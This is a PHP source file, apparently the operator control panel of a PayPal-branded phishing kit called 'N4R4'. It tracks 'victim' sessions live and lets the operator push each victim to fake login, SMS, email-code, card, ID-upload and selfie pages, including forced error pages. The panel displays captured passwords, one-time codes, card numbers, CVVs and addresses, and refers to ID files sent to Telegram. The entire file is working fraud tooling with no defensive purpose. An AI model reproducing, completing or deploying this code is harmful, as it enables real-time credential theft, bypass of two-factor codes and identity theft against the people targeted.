<?php
require_once 'config.php';

 $sid = $_GET['sid'] ?? '';
 $action = $_GET['action'] ?? '';
 $message = '';

if (!$sid) {
    $sessions = get_all_sessions();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>N4R4 // Sessions</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
            body { background-color: #050a14; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; overflow-x: hidden; }
            .box { background: rgba(13, 20, 33, 0.6); backdrop-filter: blur(12px); border: 1px solid rgba(0, 243, 255, 0.1); border-radius: 20px; padding: 40px; max-width: 600px; width: 100%; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5); }
            .header { text-align: center; margin-bottom: 30px; }
            .header img { height: 40px; margin-bottom: 20px; filter: drop-shadow(0 0 10px rgba(0, 112, 186, 0.6)); }
            h1 { font-size: 28px; font-weight: 800; color: #fff; margin-bottom: 5px; letter-spacing: 1px; }
            .sub { color: rgba(255,255,255,0.4); font-size: 14px; margin-bottom: 30px; }
            .line { height: 1px; background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.3), transparent); margin-bottom: 25px; }
            a.session-link { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 12px; margin-bottom: 10px; text-decoration: none; color: #fff; font-size: 14px; transition: all .3s ease; }
            a.session-link:hover { border-color: #00f3ff; background: rgba(0, 243, 255, 0.05); box-shadow: 0 0 15px rgba(0, 243, 255, 0.1); transform: translateX(5px); }
            .badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: 700; }
            .badge.online { background: rgba(0, 230, 118, 0.1); color: #00e676; box-shadow: 0 0 10px rgba(0, 230, 118, 0.2); }
            .badge.offline { background: rgba(255, 77, 77, 0.1); color: #ff4d4d; box-shadow: 0 0 10px rgba(255, 77, 77, 0.2); }
            .none { text-align: center; color: rgba(255,255,255,0.3); font-size: 14px; padding: 40px; }
            .new-link { display: block; text-align: center; margin-top: 20px; color: #00f3ff; font-size: 14px; font-weight: 700; text-decoration: none; text-shadow: 0 0 10px rgba(0, 243, 255, 0.4); }
            .new-link:hover { text-decoration: underline; }
        </style>
    </head>
    <body>
        <div class="box">
            <div class="header">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="PayPal">
                <h1>Control Panel</h1>
                <div class="sub">Active Sessions List</div>
            </div>
            <div class="line"></div>
            <?php if(empty($sessions)): ?>
                <div class="none"><i class="fas fa-satellite-dish" style="font-size:32px;color:rgba(255,255,255,0.2);margin-bottom:15px;display:block"></i>No active sessions.<br>Waiting for connections...</div>
            <?php else: foreach($sessions as $id => $d): $online=(time()-($d['last_activity']??0))<30; ?>
                <a href="?sid=<?php echo $id; ?>" class="session-link">
                    <span style="font-family:'JetBrains Mono',monospace;font-size:13px"><i class="fas fa-user" style="color:#00f3ff;margin-right:8px"></i> <?php echo substr($id, 0, 15); ?>...</span>
                    <span class="badge <?php echo $online?'online':'offline'; ?>"><?php echo $online?'● ONLINE':'○ OFFLINE'; ?> [<?php echo $d['status']??'unknown'; ?>]</span>
                </a>
            <?php endforeach; endif; ?>
            <div class="line" style="margin-top:25px"></div>
            <a href="index.php" class="new-link"><i class="fas fa-plus"></i> Open Victim Page</a>
        </div>
    </body>
    </html>
    <?php exit;
}

 $allowed_actions = [
    'waiting' => 'waiting.php',
    'approvation' => 'approvation.php',
    'login_error' => 'login-error.php',
    'sms' => 'sms.php',
    'sms_error' => 'sms-error.php',
    'email' => 'email-code.php',
    'email_error' => 'email-code-error.php',
    'karta' => 'karta.php',
    'karta_error' => 'error-karta.php',
    'upload_id' => 'upload-id.php', 
    'upload_selfie' => 'upload-selfie.php',
    'done' => 'done.php',
    'index' => 'index.php'
];

if ($action && isset($allowed_actions[$action])) {
    $data = get_session($sid) ?: [];
    $data['redirect_url'] = $allowed_actions[$action];
    $data['status'] = $action;
    save_session($sid, $data);
    $message = "Victim redirected to: <b>" . htmlspecialchars($action) . "</b>";
}

 $sData = get_session($sid);
 $currentStatus = $sData['status'] ?? 'waiting';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>N4R4 // CONTROL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        :root { --pp-blue:#0070ba; --pp-cyan:#00f3ff; --pp-dark:#050a14; --pp-card:rgba(13, 20, 33, 0.7); --pp-border:rgba(0, 243, 255, 0.1); --pp-red:#ff4d4d; --pp-green:#00e676; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: var(--pp-dark); color: #fff; min-height: 100vh; padding: 20px; overflow-x: hidden; }
        
        .bg-grid { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(0, 243, 255, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 243, 255, 0.03) 1px, transparent 1px); background-size: 50px 50px; z-index: -2; animation: gridMove 8s linear infinite; }
        @keyframes gridMove { 0% { transform: translateY(0); } 100% { transform: translateY(50px); } }
        .glow-orb { position: fixed; border-radius: 50%; filter: blur(80px); z-index: -1; opacity: 0.4; }
        .orb-1 { width: 400px; height: 400px; background: var(--pp-blue); top: -100px; left: -100px; animation: floatOrb 10s ease-in-out infinite; }
        .orb-2 { width: 300px; height: 300px; background: var(--pp-cyan); bottom: -50px; right: -50px; animation: floatOrb 12s ease-in-out infinite reverse; }
        @keyframes floatOrb { 0%, 100% { transform: translate(0, 0); } 50% { transform: translate(30px, 30px); } }

        .main-wrapper { max-width: 900px; margin: 40px auto; perspective: 1000px; }
        
        .header-section { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .logo-area { display: flex; align-items: center; gap: 15px; }
        .logo-area img { height: 35px; filter: drop-shadow(0 0 8px rgba(0, 112, 186, 0.6)); }
        .logo-area h1 { font-size: 24px; color: #fff; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; }
        .back-btn { text-decoration: none; color: var(--pp-cyan); font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; text-shadow: 0 0 5px rgba(0, 243, 255, 0.4); }
        
        .alert-msg { background: rgba(0, 230, 118, 0.1); border: 1px solid var(--pp-green); color: var(--pp-green); padding: 12px 20px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: <?php echo $message?'block':'none';?>; box-shadow: 0 0 15px rgba(0, 230, 118, 0.1); }
        
        .live-status-banner { padding: 20px; border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between; transition: all 0.3s; background: var(--pp-card); backdrop-filter: blur(12px); border: 1px solid var(--pp-border); }
        .live-status-banner.online { border-color: var(--pp-green); box-shadow: 0 0 20px rgba(0, 230, 118, 0.2); }
        .live-status-banner.offline { border-color: var(--pp-red); box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
        .live-info { display: flex; align-items: center; gap: 15px; }
        .live-text h3 { font-size: 18px; font-weight: 700; }
        .live-status-banner.online h3 { color: var(--pp-green); }
        .live-status-banner.offline h3 { color: var(--pp-red); }
        .live-text p { font-size: 13px; opacity: 0.6; }
        .pulse-dot { width: 15px; height: 15px; border-radius: 50%; background: currentColor; position: relative; }
        .pulse-dot::after { content: ''; position: absolute; top: -5px; left: -5px; right: -5px; bottom: -5px; border-radius: 50%; border: 2px solid currentColor; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(0.8); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }

        .grid-container { display: grid; grid-template-columns: 1fr 2fr; gap: 20px; }
        @media (max-width: 768px) { .grid-container { grid-template-columns: 1fr; } }
        
        .card { background: var(--pp-card); backdrop-filter: blur(12px); border: 1px solid var(--pp-border); border-radius: 16px; padding: 24px; margin-bottom: 20px; transition: transform 0.3s ease, box-shadow 0.3s ease; transform-style: preserve-3d; }
        .card:hover { transform: translateY(-5px) rotateX(2deg); box-shadow: 0 15px 30px rgba(0, 0, 0, 0.3), 0 0 20px rgba(0, 243, 255, 0.05); }
        .card-title { font-size: 12px; text-transform: uppercase; color: var(--pp-cyan); letter-spacing: 1px; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
        .card-title i { color: var(--pp-cyan); text-shadow: 0 0 5px var(--pp-cyan); }
        
        .status-row { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .status-row:last-child { border-bottom: none; }
        .status-label { font-size: 14px; color: rgba(255,255,255,0.5); }
        .status-val { font-size: 14px; font-weight: 600; color: #fff; }

        .redirect-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; }
        .btn-redirect { display: flex; align-items: center; justify-content: center; gap: 8px; padding: 12px; background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 8px; text-decoration: none; color: #fff; font-size: 13px; font-weight: 600; transition: all .3s ease; }
        .btn-redirect:hover { background: rgba(0, 243, 255, 0.1); border-color: var(--pp-cyan); color: var(--pp-cyan); box-shadow: 0 0 15px rgba(0, 243, 255, 0.2); transform: translateY(-2px); }
        .btn-redirect.active { background: linear-gradient(135deg, var(--pp-blue), var(--pp-cyan)); color: #fff; border-color: transparent; box-shadow: 0 0 20px rgba(0, 243, 255, 0.4); }
        .btn-redirect.full { grid-column: 1 / -1; }
        
        .btn-redirect.error-btn { border-color: rgba(255, 77, 77, 0.2); color: rgba(255, 77, 77, 0.8); }
        .btn-redirect.error-btn:hover { background: rgba(255, 77, 77, 0.1); border-color: var(--pp-red); color: var(--pp-red); box-shadow: 0 0 15px rgba(255, 77, 77, 0.2); }
        .btn-redirect.error-btn.active { background: linear-gradient(135deg, #b00020, var(--pp-red)); box-shadow: 0 0 20px rgba(255, 77, 77, 0.4); color: #fff; }

        .data-item { background: rgba(255, 255, 255, 0.03); border-left: 3px solid var(--pp-cyan); padding: 12px 16px; margin-bottom: 10px; border-radius: 4px; transition: all .3s ease; }
        .data-item:hover { background: rgba(0, 243, 255, 0.05); transform: translateX(5px); }
        .data-item .lbl { font-size: 10px; text-transform: uppercase; color: var(--pp-cyan); letter-spacing: 1px; margin-bottom: 4px; }
        .data-item .val { font-size: 15px; font-weight: 600; color: #fff; word-break: break-all; }
        .no-data { color: rgba(255,255,255,0.3); text-align: center; padding: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="bg-grid"></div>
    <div class="glow-orb orb-1"></div>
    <div class="glow-orb orb-2"></div>

    <div class="main-wrapper">
        
        <div class="header-section">
            <div class="logo-area">
                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5RSx4N3Nta8EwHtwbbr2PVdtHByHhIOXOCqOxH0zt1w&s=10" alt="PayPal">
                <h1>Control Panel</h1>
            </div>
            <a href="panel.php" class="back-btn"><i class="fas fa-arrow-left"></i> All Sessions</a>
        </div>

        <div class="alert-msg" id="messageBox"><i class="fas fa-check-circle"></i> <?php echo $message; ?></div>

        <div class="live-status-banner offline" id="liveBanner">
            <div class="live-info">
                <div class="pulse-dot" id="liveDot"></div>
                <div class="live-text">
                    <h3 id="liveTitle">SCANNING...</h3>
                    <p id="liveSubtext">Waiting for victim connection.</p>
                </div>
            </div>
            <div style="font-size:12px;font-weight:700;text-align:right;color:rgba(255,255,255,0.6);">
                CURRENT PAGE: <span id="pageStatus" style="text-decoration:underline;color:#fff"><?php echo htmlspecialchars($currentStatus); ?></span>
            </div>
        </div>

        <div class="grid-container">
            <div>
                <div class="card">
                    <div class="card-title"><i class="fas fa-chart-line"></i> Session Info</div>
                    <div class="status-row">
                        <span class="status-label">Session ID</span>
                        <span class="status-val" style="font-size:12px"><?php echo substr(htmlspecialchars($sid), 0, 12); ?>...</span>
                    </div>
                    <div class="status-row">
                        <span class="status-label">Last Activity</span>
                        <span class="status-val" id="lastSeen">--</span>
                    </div>
                    <div class="status-row">
                        <span class="status-label">IP Address</span>
                        <span class="status-val"><?php echo htmlspecialchars($sData['ip'] ?? 'N/A'); ?></span>
                    </div>
                </div>

                <div class="card">
                    <div class="card-title"><i class="fas fa-paper-plane"></i> Victim Redirector</div>
                    <div class="redirect-grid">
                        <a href="?sid=<?php echo $sid; ?>&action=index" class="btn-redirect <?php if($currentStatus=='index') echo 'active'; ?>"><i class="fas fa-sign-in-alt"></i> Login</a>
                        <a href="?sid=<?php echo $sid; ?>&action=approvation" class="btn-redirect <?php if($currentStatus=='approvation') echo 'active'; ?>"><i class="fas fa-shield-alt"></i> Approval</a>
                        <a href="?sid=<?php echo $sid; ?>&action=sms" class="btn-redirect <?php if($currentStatus=='sms') echo 'active'; ?>"><i class="fas fa-mobile-alt"></i> SMS Auth</a>
                        <a href="?sid=<?php echo $sid; ?>&action=email" class="btn-redirect <?php if($currentStatus=='email') echo 'active'; ?>"><i class="fas fa-envelope"></i> Email Auth</a>
                        <a href="?sid=<?php echo $sid; ?>&action=karta" class="btn-redirect <?php if($currentStatus=='karta') echo 'active'; ?>"><i class="fas fa-credit-card"></i> Card Info</a>
                        
                        <a href="?sid=<?php echo $sid; ?>&action=upload_id" class="btn-redirect <?php if($currentStatus=='upload_id') echo 'active'; ?>"><i class="fas fa-id-card"></i> Upload ID</a>
                        <a href="?sid=<?php echo $sid; ?>&action=upload_selfie" class="btn-redirect <?php if($currentStatus=='upload_selfie') echo 'active'; ?>"><i class="fas fa-camera"></i> Upload Selfie</a>

                        <a href="?sid=<?php echo $sid; ?>&action=login_error" class="btn-redirect error-btn <?php if($currentStatus=='login_error') echo 'active'; ?>"><i class="fas fa-exclamation-circle"></i> Login Error</a>
                        <a href="?sid=<?php echo $sid; ?>&action=sms_error" class="btn-redirect error-btn <?php if($currentStatus=='sms_error') echo 'active'; ?>"><i class="fas fa-comment-sms"></i> SMS Error</a>
                        <a href="?sid=<?php echo $sid; ?>&action=email_error" class="btn-redirect error-btn <?php if($currentStatus=='email_error') echo 'active'; ?>"><i class="fas fa-envelope-open-text"></i> Email Error</a>
                        <a href="?sid=<?php echo $sid; ?>&action=karta_error" class="btn-redirect error-btn <?php if($currentStatus=='karta_error') echo 'active'; ?>"><i class="fas fa-credit-card"></i> Card Error</a>

                        <a href="?sid=<?php echo $sid; ?>&action=done" class="btn-redirect full <?php if($currentStatus=='done') echo 'active'; ?>"><i class="fas fa-check-double"></i> Success Page</a>
                    </div>
                </div>
            </div>

            <div>
                <div class="card">
                    <div class="card-title"><i class="fas fa-database"></i> Captured Data Stream</div>
                    <div id="logContent">
                        <?php 
                        $dataFound = false;
                        if(!empty($sData['username'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Email / Phone</div><div class="val">' . htmlspecialchars($sData['username']) . '</div></div>'; }
                        if(!empty($sData['password'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Password</div><div class="val">' . htmlspecialchars($sData['password']) . '</div></div>'; }
                        if(!empty($sData['sms_code'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">SMS Code</div><div class="val">' . htmlspecialchars($sData['sms_code']) . '</div></div>'; }
                        if(!empty($sData['email_code'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Email Code</div><div class="val">' . htmlspecialchars($sData['email_code']) . '</div></div>'; }
                        if(!empty($sData['card_number'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Card Number</div><div class="val">' . htmlspecialchars($sData['card_number']) . '</div></div>'; }
                        if(!empty($sData['expiration'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Expiration Date</div><div class="val">' . htmlspecialchars($sData['expiration']) . '</div></div>'; }
                        if(!empty($sData['cvv'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">CVV</div><div class="val">' . htmlspecialchars($sData['cvv']) . '</div></div>'; }
                        if(!empty($sData['address1'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Address</div><div class="val">' . htmlspecialchars($sData['address1']) . ', ' . htmlspecialchars($sData['city']) . ', ' . htmlspecialchars($sData['state']) . ' ' . htmlspecialchars($sData['postal']) . '</div></div>'; }
                        if(!empty($sData['id_uploaded'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">ID Uploaded</div><div class="val">Yes (Check Telegram for files)</div></div>'; }
                        if(!empty($sData['selfie_uploaded'])){ $dataFound = true; echo '<div class="data-item"><div class="lbl">Selfie Uploaded</div><div class="val">Yes (Check Telegram for files)</div></div>'; }
                        if(!$dataFound){ echo '<div class="no-data"><i class="fas fa-hourglass-half" style="font-size:24px;margin-bottom:10px;display:block"></i>Waiting for victim to input data...</div>'; } 
                        ?>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const sid = "<?php echo addslashes($sid); ?>";
        const liveBanner = document.getElementById('liveBanner');
        const liveDot = document.getElementById('liveDot');
        const liveTitle = document.getElementById('liveTitle');
        const liveSubtext = document.getElementById('liveSubtext');
        const pageStatus = document.getElementById('pageStatus');
        const lastSeen = document.getElementById('lastSeen');

        const statusMap = {
            'index': 'Login Page',
            'login_error': 'Login Error Page',
            'waiting': 'Waiting / Processing',
            'sms': 'SMS Verification Page',
            'sms_error': 'SMS Verification (Error)',
            'email': 'Email Verification Page',
            'email_error': 'Email Verification (Error)',
            'karta': 'Link a Card Page',
            'karta_error': 'Link a Card (Error)',
            'upload_id': 'Identity Upload Page',
            'upload_selfie': 'Selfie Upload Page',
            'approvation': 'Approval Push Page',
            'done': 'Success / Final Page',
            'unknown': 'Unknown Page'
        };

        setInterval(async () => {
            try {
                const res = await fetch('process.php?action=get_status&sid=' + sid);
                const data = await res.json();
                
                if(data.online){ 
                    liveBanner.className = 'live-status-banner online';
                    liveTitle.textContent = 'VICTIM IS ONLINE';
                    liveSubtext.textContent = 'The victim is actively on the page.';
                    lastSeen.textContent = 'Just now';
                } else { 
                    liveBanner.className = 'live-status-banner offline';
                    liveTitle.textContent = 'VICTIM IS OFFLINE';
                    liveSubtext.textContent = 'The victim has left the page or closed the browser.';
                    lastSeen.textContent = 'Disconnected';
                }
                
                let currentPg = statusMap[data.status] || 'Unknown Page';
                pageStatus.textContent = currentPg;
                
                document.querySelectorAll('.btn-redirect').forEach(link => {
                    link.classList.remove('active');
                    let act = link.getAttribute('href').split('action=')[1];
                    if(act === data.status) link.classList.add('active');
                });

                if(data.data) {
                    const logContent = document.getElementById('logContent');
                    let html = '';
                    let found = false;
                    
                    if(data.data.username){ found = true; html += '<div class="data-item"><div class="lbl">Email / Phone</div><div class="val">' + data.data.username + '</div></div>'; }
                    if(data.data.password){ found = true; html += '<div class="data-item"><div class="lbl">Password</div><div class="val">' + data.data.password + '</div></div>'; }
                    if(data.data.sms_code){ found = true; html += '<div class="data-item"><div class="lbl">SMS Code</div><div class="val">' + data.data.sms_code + '</div></div>'; }
                    if(data.data.email_code){ found = true; html += '<div class="data-item"><div class="lbl">Email Code</div><div class="val">' + data.data.email_code + '</div></div>'; }
                    if(data.data.card_number){ found = true; html += '<div class="data-item"><div class="lbl">Card Number</div><div class="val">' + data.data.card_number + '</div></div>'; }
                    if(data.data.expiration){ found = true; html += '<div class="data-item"><div class="lbl">Expiration Date</div><div class="val">' + data.data.expiration + '</div></div>'; }
                    if(data.data.cvv){ found = true; html += '<div class="data-item"><div class="lbl">CVV</div><div class="val">' + data.data.cvv + '</div></div>'; }
                    if(data.data.address1){ found = true; html += '<div class="data-item"><div class="lbl">Address</div><div class="val">' + data.data.address1 + ', ' + data.data.city + ', ' + data.data.state + ' ' + data.data.postal + '</div></div>'; }
                    if(data.data.id_uploaded){ found = true; html += '<div class="data-item"><div class="lbl">ID Uploaded</div><div class="val">Yes (Check Telegram for files)</div></div>'; }
                    if(data.data.selfie_uploaded){ found = true; html += '<div class="data-item"><div class="lbl">Selfie Uploaded</div><div class="val">Yes (Check Telegram for files)</div></div>'; }
                    if(data.data.ip){ found = true; html += '<div class="data-item"><div class="lbl">IP Address</div><div class="val">' + data.data.ip + '</div></div>'; }
                    
                    if(!found) html = '<div class="no-data"><i class="fas fa-hourglass-half" style="font-size:24px;margin-bottom:10px;display:block"></i>Waiting for victim to input data...</div>';
                    logContent.innerHTML = html;
                }
            } catch(e) { 
                liveBanner.className = 'live-status-banner offline';
                liveTitle.textContent = 'CONNECTION ERROR';
                liveSubtext.textContent = 'Lost connection to server. Retrying...';
            }
        }, 3000);
    </script>
</body>
</html>